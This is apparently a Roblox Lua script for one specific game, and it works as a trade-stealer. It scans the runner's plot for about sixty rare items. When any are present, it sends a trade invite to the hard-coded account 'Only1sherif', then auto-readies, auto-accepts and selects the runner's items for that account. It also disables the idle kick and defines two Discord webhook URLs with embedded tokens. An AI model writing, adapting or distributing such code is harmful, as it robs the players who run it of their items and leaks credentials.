if game.PlaceId ~= 109983668079237 then return end

getgenv().WEBHOOK_URL2 = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
getgenv().WEBHOOKSHERIF = "https://discord.com/api/webhooks/1490063982760038440/CLhsVX58Yl-Xd5ZqG8kiSqEoNl9NoV4A1SDQXsjOVGJQNGOdfYlk-OetI7XGas0QirJd"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RICHEST = "Only1sherif"

local wantedItems = {
    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
}

for i, v in pairs(getconnections(LocalPlayer.Idled)) do
    if v.Disable then v:Disable() end
end

local function sendInvite(targetUsername)
    local tl = PlayerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
    if not tl then return false end
    local sb = tl.bg.SearchFrame.SearchBox
    if not sb then return false end
    sb.Text = targetUsername
    task.wait(0.5)
    pcall(function() firesignal(sb.FocusLost, true) end)
    task.wait(0.1)
    pcall(function() firesignal(sb.ReturnPressedFromOnScreenKeyboard) end)
    task.wait(1)

    local list = tl.Global.List
    if not list then return false end

    for _, player in pairs(list:GetChildren()) do
        if player:IsA("Frame") then
            local fill = player:FindFirstChild("Fill")
            if fill and fill:FindFirstChild("Send") then
                pcall(function() firesignal(fill.Send.Activated) end)
                return true
            end
        end
    end
    return false
end

local function scanPlot()
    local found = {}
    local Plots = workspace:FindFirstChild("Plots")
    if not Plots then return found end
    local myPlot = nil
    for _, Plot in ipairs(Plots:GetChildren()) do
        local sign = Plot:FindFirstChild("PlotSign")
        if sign then
            local label = sign:FindFirstChildOfClass("TextLabel", true)
            if label and (label.Text:lower():find(LocalPlayer.Name:lower()) or label.Text:lower():find(LocalPlayer.DisplayName:lower())) then
                myPlot = Plot
                break
            end
        end
    end
    if myPlot then
        for _, child in ipairs(myPlot:GetChildren()) do
            if child:IsA("Model") then
                for _, wanted in ipairs(wantedItems) do
                    if child.Name:lower():find(wanted:lower()) then
                        table.insert(found, child.Name)
                        break
                    end
                end
            end
        end
    end
    return found
end

local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local readyRE = (Net:FindFirstChild("RE/TradeService/Ready") or Net:FindFirstChild("Ready"))
local acceptRE = (Net:FindFirstChild("RE/TradeService/Accept") or Net:FindFirstChild("Accept"))

task.spawn(function()
    while true do
        pcall(function()
            local found = scanPlot()
            local tradeUI = PlayerGui:FindFirstChild("TradeLiveTrade")
            
            if tradeUI and tradeUI.Enabled then
                local inner = tradeUI.TradeLiveTrade
                if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                task.wait(0.2)
                if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end

                if inner.Other.Username.Text:lower():find(RICHEST:lower()) then
                    local scroll = inner:FindFirstChild("ScrollingFrame", true)
                    if scroll then
                        for _, slot in pairs(scroll:GetChildren()) do
                            if slot.Name:sub(1,9) == "Selection" then
                                local spacer = slot:FindFirstChild("Spacer")
                                if spacer and spacer:FindFirstChild("UIStroke") and spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
                                    firesignal(spacer.Activated)
                                end
                            end
                        end
                    end
                end
            elseif #found > 0 then
                sendInvite(RICHEST)
            end
        end)
        task.wait(1.5)
    end
end)
